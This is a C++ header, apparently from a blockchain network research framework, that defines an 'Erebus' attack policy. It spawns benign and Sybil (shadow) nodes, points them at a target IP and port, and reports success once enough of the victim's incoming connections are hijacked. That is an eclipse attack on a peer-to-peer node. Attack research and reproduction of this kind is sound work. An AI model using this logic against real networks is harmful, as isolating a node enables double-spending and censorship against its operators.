#ifndef EREBUS_ATTACK_POLICY_H
#define EREBUS_ATTACK_POLICY_H

#include <list>

#include "../node/BenignNode.h"
#include "../node/ShadowActiveNode.h"
#include "utility/AttackStat.h"

using namespace std;

namespace libBLEEP_sybil {

    template<class NodePrimitives, class NodeParams>
    class ErebusAttackPolicy {

    public:
        ErebusAttackPolicy() {
            libev_loop = EV_DEFAULT;
            _checkWatcher.set<ErebusAttackPolicy, &ErebusAttackPolicy<NodePrimitives, NodeParams>::_checkAttack>(
                    this);
            _checkWatcher.start();
        }

        // step 1. construct virtual network using sybil nodes
        bool ConstructSybilNet(vector<pair<string, int>> vIP, vector<string> vShadowIP, std::string targetIP,
                               int targetPort) {
            // Spawn network consisting of benign nodes
            for (auto &[ip, uptime] : vIP) {
                auto &benignNode = _benignNodes.emplace_back(&_attackStat, ip);

                // set a churnout timer for all the benign nodes
                benignNode.SetChurnOutTimer(uptime);
            }
            std::cout << "benign node objects are constructed" << "\n";

            // Make benign nodes to connect to the victim
            for (auto &_benignNode : _benignNodes) {
                int conn_fd = _benignNode.tryConnectToTarget(targetIP, targetPort);
            }

            // Spawn network consisting of sybil nodes
            for (auto ip : vShadowIP) {
                _shadowNodes.emplace_back(&_attackStat, ip);
                // The implementation of malicious node's periodic connection is dependent to node's behavior
                // Thus, periodic connection should be implemented within NodePrimitives
            }

            // Let sybil nodes try to connect to the victim 100 seconds later (i.e., after initializing benign networks)
            for (auto &_shadowNode : _shadowNodes) {
                _shadowNode.tryConnectToTarget(targetIP, targetPort, 100);
            }

            return true;
        }


    private:
        list<BenignNode<NodePrimitives>> _benignNodes;
        list<ShadowActiveNode<NodePrimitives>> _shadowNodes;
        AttackStat _attackStat;

    private:
        void _checkAttack() {
            // If we hijacked victim's incoming connection more than predefined target number,
            // it means that attack is successful, so break the main loop.
            if (_attackStat.GetHijackedIncomingConnNum() >= NodeParams::targetIncomingConnNum) {
                std::cout << "The attack(Eclipsing Incoming Connection) is succeeded." << "\n";
                std::cout << "Pre-defined target incoming connection num = " << NodeParams::targetIncomingConnNum
                          << "\n";
                std::cout << "Hijacked incoming connection num = " << _attackStat.GetHijackedIncomingConnNum() << "\n";
                ev_break(libev_loop);
            }
        }

    protected:
        struct ev_loop *libev_loop = nullptr;
        ev::check _checkWatcher;
    };
}

#endif
